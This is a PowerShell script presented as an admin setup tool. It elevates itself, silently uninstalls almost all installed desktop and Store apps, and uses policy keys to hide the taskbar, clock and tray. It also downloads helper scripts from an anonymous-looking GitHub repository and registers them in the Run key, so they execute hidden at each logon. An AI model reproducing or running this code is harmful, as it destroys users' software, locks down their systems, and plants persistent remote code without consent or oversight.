<#
.SYNOPSIS
  Clear removable apps, hide the taskbar, show launch badges.
#>
[CmdletBinding()]
param(
  [switch]$SkipWipe,
  [switch]$SkipTray,
  [switch]$ShowReport
)
Set-StrictMode -Version 1
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
function Test-IsAdmin {
  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
  $p = New-Object Security.Principal.WindowsPrincipal($id)
  return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
function Get-Prop {
  param($Object, [string]$Name)
  if ($null -eq $Object) { return $null }
  $prop = $Object.PSObject.Properties[$Name]
  if ($prop) { return $prop.Value }
  return $null
}
function Get-SelfPath {
  foreach ($candidate in @($PSCommandPath, (Get-Prop $MyInvocation.MyCommand 'Path'), (Get-Prop $MyInvocation.MyCommand 'Definition'))) {
    if ($candidate -and $candidate -like '*.ps1' -and (Test-Path -LiteralPath $candidate)) { return $candidate }
  }
  return $null
}
function Test-NameLike([string]$Name, [string[]]$Patterns) {
  if ([string]::IsNullOrWhiteSpace($Name)) { return $false }
  foreach ($pattern in $Patterns) { if ($Name -like $pattern) { return $true } }
  return $false
}
$homeRoot = Join-Path $env:USERPROFILE 'admin'
New-Item -ItemType Directory -Force -Path $homeRoot | Out-Null
$log = Join-Path $homeRoot 'Clear-Apps-And-Tray.log'
$reportFile = Join-Path $homeRoot 'Clear-Apps-And-Tray-last.txt'
$script:ReportKept = New-Object System.Collections.Generic.List[string]
$script:ReportCleared = New-Object System.Collections.Generic.List[string]
$script:ReportFailed = New-Object System.Collections.Generic.List[string]
$script:ReportFound = 0
function Write-Log([string]$Message) {
  $line = '{0:yyyy-MM-dd HH:mm:ss} {1}' -f (Get-Date), $Message
  try { Add-Content -Path $log -Value $line -ErrorAction SilentlyContinue } catch {}
}
Write-Log 'Clear-Apps-And-Tray 20260919n fast'
if (-not (Test-IsAdmin)) {
  $self = Get-SelfPath
  if (-not $self) { $self = $MyInvocation.MyCommand.Definition }
  $arg = @('-STA','-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$self`"")
  if ($SkipWipe) { $arg += '-SkipWipe' }
  if ($SkipTray) { $arg += '-SkipTray' }
  if ($ShowReport) { $arg += '-ShowReport' }
  Start-Process -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -Verb RunAs -ArgumentList $arg | Out-Null
  return
}
function Test-HelperRunning([string]$Needle) {
  $hit = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -and $_.CommandLine -like "*$Needle*" }
  return [bool]$hit
}
function Install-Helper([string]$Name) {
  $dest = Join-Path $homeRoot $Name
  if (Test-Path -LiteralPath $dest) { return $dest }
  $here = Split-Path -Parent (Get-SelfPath)
  $local = Join-Path $here $Name
  if ($local -and (Test-Path -LiteralPath $local)) { Copy-Item -LiteralPath $local -Destination $dest -Force }
  else { try { Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/$Name" -OutFile $dest } catch {} }
  return $dest
}
function Start-HiddenScript([string]$Path, [string]$RunName) {
  if (-not (Test-Path -LiteralPath $Path)) { return }
  $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
  New-Item -Path $runKey -Force | Out-Null
  $cmd = "`"$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$Path`""
  New-ItemProperty -Path $runKey -Name $RunName -Value $cmd -PropertyType String -Force | Out-Null
  $leaf = Split-Path $Path -Leaf
  if (Test-HelperRunning $leaf) { return }
  Start-Process -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$Path`"") | Out-Null
}
function Wait-ShortProcess($Proc, [int]$Ms = 15000) {
  if (-not $Proc) { return $false }
  if ($Proc.WaitForExit($Ms)) {
    return ($null -eq $Proc.ExitCode -or $Proc.ExitCode -in 0, 1, 1605, 1614, 1641, 3010)
  }
  try { $Proc.Kill() } catch {}
  return $false
}
function Invoke-UninstallCommand([string]$Command) {
  if ([string]::IsNullOrWhiteSpace($Command)) { return $false }
  if ($Command -match '(?i)explorer(\.exe)?') { return $false }
  try {
    if ($Command -match '\{([0-9A-Fa-f-]{36})\}') {
      $p = Start-Process -FilePath 'msiexec.exe' -ArgumentList @("/X{$($Matches[1])}", '/qn', '/norestart') -PassThru -WindowStyle Hidden
      return (Wait-ShortProcess $p 20000)
    }
    $exe = $Command; $args = ''
    if ($Command -match '^"([^"]+)"\s*(.*)$') { $exe = $Matches[1]; $args = [string]$Matches[2] }
    elseif ($Command -match '^(\S+)\s*(.*)$') { $exe = $Matches[1]; $args = [string]$Matches[2] }
    if ($exe -match '(?i)explorer(\.exe)?$' -or -not (Test-Path -LiteralPath $exe)) { return $false }
    $low = "$args".ToLowerInvariant()
    if ($low -notmatch '/s\b|/silent|/quiet|/qn|/norestart') { $args = ("$args /S /silent /quiet /norestart").Trim() }
    $p = Start-Process -FilePath $exe -ArgumentList $args -PassThru -WindowStyle Hidden
    return (Wait-ShortProcess $p 15000)
  } catch { return $false }
}
function Invoke-ClearWin32Apps {
  $protect = @('Microsoft Visual C++*','Microsoft Visual Studio* Redistributable*','Microsoft .NET*','Microsoft Edge*','Microsoft Edge WebView2*','Microsoft Update*','Windows PC Health Check*','Update for *','Security Update*','Hotfix*','Intel*','NVIDIA*','AMD*','Chipset*','Canon *','HP *','Printer*','Driver*','Windows Terminal*','Windows SDK*','Microsoft Windows*','Windows Malicious Software Removal*')
  $force = @('Realtek*')
  $paths = @('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*')
  $removed = 0
  foreach ($prog in @(Get-ItemProperty $paths -ErrorAction SilentlyContinue)) {
    $name = [string](Get-Prop $prog 'DisplayName')
    if (-not $name) { continue }
    $script:ReportFound++
    $forced = Test-NameLike $name $force
    if (-not $forced) {
      $systemComponent = Get-Prop $prog 'SystemComponent'
      if ($null -ne $systemComponent) { try { if ([int]$systemComponent -eq 1) { continue } } catch {} }
      if (Test-NameLike $name $protect) { [void]$script:ReportKept.Add($name); continue }
    }
    $uninstall = [string](Get-Prop $prog 'QuietUninstallString')
    if (-not $uninstall) { $uninstall = [string](Get-Prop $prog 'UninstallString') }
    if (-not $uninstall) { continue }
    if (Invoke-UninstallCommand $uninstall) { $removed++; [void]$script:ReportCleared.Add($name) } else { [void]$script:ReportFailed.Add($name) }
  }
  return $removed
}
function Invoke-ClearStoreApps {
  $keepAppx = @('Microsoft.WindowsStore','Microsoft.StorePurchaseApp','Microsoft.WindowsTerminal','MicrosoftWindows.Client*','Microsoft.Windows.*','Microsoft.UI.*','Microsoft.VCLibs*','Microsoft.Services.Store*','windows.immersivecontrolpanel','Microsoft.DesktopAppInstaller','Microsoft.SecHealthUI','Microsoft.MicrosoftEdge*','Microsoft.ECApp','Microsoft.LockApp','Microsoft.AAD.BrokerPlugin','Microsoft.AccountsControl','Microsoft.BioEnrollment','Microsoft.CredDialogHost','Microsoft.Win32WebViewHost','Microsoft.XboxGameCallableUI','Microsoft.PPIProjection')
  $removed = 0
  $pkgs = @()
  try { $pkgs = @(Get-AppxPackage -ErrorAction SilentlyContinue) } catch {}
  foreach ($pkg in $pkgs) {
    $name = [string]$pkg.Name
    if (-not $name) { continue }
    $script:ReportFound++
    if ($pkg.IsFramework -or $pkg.NonRemovable) { continue }
    if (Test-NameLike $name $keepAppx) { continue }
    if ($name -like 'Microsoft.Windows.*' -or $name -like 'Windows.*') { continue }
    try { Remove-AppxPackage -Package $pkg.PackageFullName -ErrorAction SilentlyContinue; $removed++; [void]$script:ReportCleared.Add("Store: $name") }
    catch { [void]$script:ReportFailed.Add("Store: $name") }
  }
  return $removed
}
function Set-NoTaskbar {
  $path = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer'
  New-Item -Path $path -Force | Out-Null
  foreach ($pair in @{ NoTrayItemsDisplay = 1; HideClock = 1; HideSCAHealth = 1; HideSCAMeetNow = 1; HideSCANetwork = 1; HideSCAVolume = 1; HideSCAPower = 1; NoAutoTrayNotify = 1; NoSetTaskbar = 1; NoTrayContextMenu = 1 }.GetEnumerator()) {
    try { New-ItemProperty -Path $path -Name $pair.Key -Value $pair.Value -PropertyType DWord -Force | Out-Null } catch {}
  }
  Start-HiddenScript (Install-Helper 'Hide-Taskbar.ps1') 'AdminSetupHideTaskbar'
  Start-HiddenScript (Install-Helper 'Show-FolderLogo.ps1') 'AdminSetupFolderLogo'
}
function Show-WipeReport {
  $lines = @(
    "Clear-Apps-And-Tray  $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')",
    "Computer  $env:COMPUTERNAME    User  $env:USERNAME",
    '',
    "Found     $($script:ReportFound)",
    "Cleared   $($script:ReportCleared.Count)",
    "Kept      $($script:ReportKept.Count)",
    "Failed    $($script:ReportFailed.Count)",
    '',
    '--- Cleared ---'
  )
  if ($script:ReportCleared.Count -eq 0) { $lines += '(none)' } else { $lines += ($script:ReportCleared | Sort-Object) }
  $lines += '', '--- Failed ---'
  if ($script:ReportFailed.Count -eq 0) { $lines += '(none)' } else { $lines += ($script:ReportFailed | Sort-Object) }
  $lines += '', '--- Kept ---'
  if ($script:ReportKept.Count -eq 0) { $lines += '(none)' } else { $lines += ($script:ReportKept | Sort-Object) }
  $text = $lines -join [Environment]::NewLine
  $text | Set-Content -Path $reportFile -Encoding UTF8
  Start-Process -FilePath "$env:SystemRoot\system32\notepad.exe" -ArgumentList $reportFile | Out-Null
}
$win32 = 0; $store = 0
if (-not $SkipWipe) { $win32 = Invoke-ClearWin32Apps; $store = Invoke-ClearStoreApps }
if (-not $SkipTray) { Set-NoTaskbar }
Write-Log "Finished Win32=$win32 Store=$store"
Show-WipeReport
